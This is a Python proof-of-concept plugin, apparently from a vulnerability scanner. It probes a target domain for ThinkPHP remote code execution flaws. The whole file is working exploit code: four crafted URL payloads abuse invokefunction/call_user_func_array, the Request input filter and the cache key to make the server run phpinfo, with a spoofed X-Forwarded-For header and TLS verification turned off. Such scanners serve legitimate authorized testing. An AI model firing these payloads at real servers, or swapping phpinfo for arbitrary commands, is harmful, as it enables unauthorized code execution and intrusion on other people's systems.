#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""

import sys
from lib.core.Request import request
# try :
#     import tldextract
# except:
#     print('Cant import tldextract \nTry \"pip install tldextract\"')
#     sys.exit()

def poc(domain_url):
    try:
        # if "https://" in domain_url:
        #     protocol = "https://"
        # else:
        #     protocol = "http://"
        
        # return to top path 
        # 'https://www.xiaogeng.com.cn/admin.php?id=6'==>'https://www.xiaogeng.com.cn'
        #key_tmp  = tldextract.extract(domain_url)
        #domain_url = protocol + key_tmp.subdomain + '.' + key_tmp.domain+'.' + key_tmp.suffix 

        if "http" not in domain_url:
            domain_url = "http://" + domain_url
            

        poc0 = '/index.php/?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
        poc1 = '/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
        poc2 = '/index.php/?s=index/\\think\Request/input&filter=phpinfo&data=1'
        poc3 = '/index.php?s=/index/\\think\\request/cache&key=1|phpinfo'
        poclist = [poc0,poc1,poc2,poc3]
        headers = {
            "Accept": "*/*",
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50",
            "X-Forwarded-For":"192.168.1.1"
        }
        for poc in poclist:
            r = request.get(domain_url + poc, headers=headers,verify=False, timeout =10,allow_redirects=False)
            if "PHP Version" in r.text:
                return domain_url + poc
        
        return 0
    except Exception as e:
        return 0

